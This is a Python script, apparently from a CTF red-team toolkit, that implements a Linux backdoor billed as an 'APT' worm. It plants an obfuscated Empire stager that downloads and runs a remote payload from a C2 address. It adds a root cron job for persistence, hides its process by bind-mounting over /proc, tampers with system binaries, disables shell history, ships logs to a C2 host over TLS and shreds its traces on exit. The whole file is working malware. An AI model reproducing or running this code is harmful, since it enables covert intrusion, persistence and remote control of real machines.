#!/usr/bin/env python3
"""
#****************************************************************#
#           Author        - pyCity                               #
#           Date          - 4/16/2019                            #
#           Version       - 1.0                                  #
#                                                                #
#           Usage         - python3 one_shot.py                  #
#                                                                #
#           Goal          - 'APT' worm for dropping in CTFs      #
#                                                                #
#           Description   -                                      #
#                                                                #
#****************************************************************#
"""

import sys
import os
import ssl
import socket
import logging
import subprocess
import threading

from Dropper import fix_binaries
from random import choice
from datetime import datetime
from time import sleep


# -------------------------------------------------------------------------------------------------

# Only allow root

if os.getuid() != 0:
    exit("[!] Must run as root")

# -------------------------------------------------------------------------------------------------

# Variables

host = "127.0.0.1"  # Host IP and port to recieve logs
port = 443

expiration_date = "2019-12-10"  # Date to shred self
hidden_directory = "/etc/.systemd/"  # Hidden directory to house malware

stager_name = "backd"  # Name of the payload file to apply persistence
stager_path = hidden_directory + stager_name  # Path of the payload

# Payload of choice (Empire)
stager_code = """#!/bin/bash\necho "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgc3NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0Jyk6c3NsLl9jcmVhdGVfZGVmYXVsdF9odHRwc19jb250ZXh0ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0OwppbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHBzOi8vMTAuMC4wLjIyOjQ0Myc7dD0nL2FkbWluL2dldC5waHAnO3JlcT11cmxsaWIyLlJlcXVlc3Qoc2VydmVyK3QpOwpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsVUEpOwpyZXEuYWRkX2hlYWRlcignQ29va2llJywic2Vzc2lvbj16dkc4RUVFNDEwbGRHZkxrc3RFeWd3SXA1Rk09Iik7CnByb3h5ID0gdXJsbGliMi5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKHByb3h5KTsKdXJsbGliMi5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIyLnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisnT15tWGF5LFdCY3QzbDxRZjBbSU1ldy1Vezo9QF82flYnO1MsaixvdXQ9cmFuZ2UoMjU2KSwwLFtdCmZvciBpIGluIHJhbmdlKDI1Nik6CiAgICBqPShqK1NbaV0rb3JkKGtleVtpJWxlbihrZXkpXSkpJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQppPWo9MApmb3IgY2hhciBpbiBkYXRhOgogICAgaT0oaSsxKSUyNTYKICAgIGo9KGorU1tpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCiAgICBvdXQuYXBwZW5kKGNocihvcmQoY2hhcileU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | /usr/bin/python &\n"""

# Code to add to /etc/cron.d/systemd-timer. Run payload every minute, run this script after system reboots
cron_code = """
SHELL=/bin/bash\n
* * * * *  root  if [[ $(pidof "python" | wc -l) -lt 1 ]]; then bash /etc/.systemd/backd; else echo 'Process alive';fi\n
@reboot root sleep 120 && {} /etc/.systemd/one_shot1.1.py\n
""".format(sys.executable)


# -------------------------------------------------------------------------------------------------

# Functions

def threaded(func):
    """
    Return a wrapper that accepts keyword arguments and starts them in a thread
    :param func: Function to start in a new thread:
    :return wrapper: on successful starting of a thread:
    """
    def wrapper(*args):
        t = threading.Thread(target=func, args=args)
        t.start()
        return
    return wrapper


@threaded
def shred_file(filename):
    """
    Try to delete file using shred, if it isn't available,
    perform a manual  3 pass override
    :param filename: Name of the file to remove
    :return True: on success:
    """

    try:
        logging.info("[+] Attempting to shred {}".format(filename))
        subprocess.run("shred -uz {}".format(filename), shell=True)
    except OSError:
        logging.warning("[!] Shred is not available. Performing manual override.")
        f = None
        try:
            f = open(filename, "ab+")
            length = f.tell()      # Read each line of the file and stop at the end
            for _ in range(0, 3):  # _ in python is short for a variable that isn't used
                f.seek(0)          # Move back to the start of the file
                f.write(os.urandom(length))  # Write garbage to file
        finally:
            if f is not None:
                f.close()
        os.remove(filename)
    logging.info("[+] {} has been securely removed")
    return


# -------------------------------------------------------------------------------------------------


# Begin initial setup of backdoor
# Log output to a txt file in hidden directory, Only save info and up (no debug) and
# send it to C2 once per day via sockets
try:

    # Don't record any history by editing environment variable
    os.putenv("HISTFILE", "/dev/null")

    # Generate id used to hide pid
    ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    token = "".join(choice(ch) for i in range(5))
    pid = os.getpid()

    # Verify hidden dir exists
    print("[+] Checking for hidden directory")
    if not os.path.exists(hidden_directory):
        os.mkdir(hidden_directory)
        print("[+] {} successfully created".format(hidden_directory))

    # Verify backd.log exists
    print("Checking for backd.log")
    if not os.path.exists(hidden_directory + "backd.log"):
        with open(hidden_directory + "backd.log", "w+") as f:
            print("[+] backd.log was successfully created.\n"
                  "[+] Initial setup complete\n "
                  "[+] Logging everything to file from here")

    # Verify .info exists
    if not os.path.exists(hidden_directory + ".info"):
        with open(".info", "w+") as f:
            f.write("NETSTAT : false\nps : false\nlsof : false")

except OSError as err:
    raise ("[!] An error occured: {}".format(err))

finally:
    os.chdir(hidden_directory)

# After creating directory and making sure backd.log exists, begin logging output to backd.log
logging.basicConfig(filename="backd.log", filemode="a", level=logging.INFO, format="%(asctime)s - %(message)s")

# STEALTH

# Hide current running process
logging.debug("Attempting to hide current pid: {}".format(pid))
if not os.path.exists(hidden_directory + token):

    # Bind mount on current process's folder in /proc to hide it
    subprocess.run("mkdir {0}{2} && mount -o bind {0}{2} /proc/{1}".format(hidden_directory, pid, token), shell=True)



# -------------------------------------------------------------------------------------------------


while True:

    """Main loop - Runs for 365 days, then cleanup + uninstall self. Assuming cpu is rebooted at arbitrary intervals"""

    try:

        # If today's date equals the expiration_date variable, remove the backdoor
        if str(expiration_date) in datetime.today():
            shred_file("/etc/cron.d/systemd-timer")
            shred_file("/etc/.systemd/*")
            shred_file("/etc/.systemd/")

        # Verify payload is written to disk
        logging.info("[+] Checking for stager in hidden directory")
        if not os.path.exists(stager_path):
            logging.debug("[+] Writing stager to hidden directory")
            with open(stager_path, "w+") as f:
                f.write(stager_code)
        else:
            logging.debug("[+] Stager exists in hidden directory")

        # Make payload executable. Since we're already running as root, no need to chown the file
        logging.debug("[+] Checking permissions for {}".format(stager_path))
        if not os.access(stager_path, os.X_OK):
            os.chmod(stager_path, 0o755)
        else:
            logging.debug("[+] {} already has proper permissions".format(stager_path))

        # Check that payload exists in crontab
        logging.debug("[+] Verifying payload keepup script is in cron.d")
        if not os.path.exists("/etc/cron.d/systemd-timer"):
            with open("/etc/cron.d/systemd-timer", "w+") as f:
                f.write(cron_code)
        else:
            logging.debug("[+] Payload keepup script exists in cron.d")

        # Verify that binaries have been modified
        logging.debug("[+] Checking the status of system binaries")
        with open(".info", "r") as f:
            if "false" in f.read():
                logging.debug("[+] Binaries have not been modified\n[+] Modifying binaries")
                fix_binaries.main()
            else:
                logging.debug("[+] Binaries have already been modified")

        # Read contents of log, store output in logs
        with open(hidden_directory + "backd.log", "r") as f:
            logs = f.read()

        # Send logs through a wrapped tcp socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = ssl.wrap_socket(sock)
        s.connect((host, port))
        s.send(str.encode(logs))
        s.close()

        # Clear previous logs before going to sleep
        shred_file("backd.log")
        with open("backd.log", "w+") as f:
            logging.info("[+] backd.log was successfully scrambled and recreated\n")

        # Sleep for 12 hours
        logging.info("[+] [ZZzz..] Sleeping for 12 hours...")
        sleep(42300)

    except KeyboardInterrupt:

        # Exit key was pressed. Uninstall rootkit and remove all traces
        shred_file("/etc/cron.d/systemd-timer")
        shred_file("/etc/.systemd/*")
        shred_file("/etc/.systemd/")
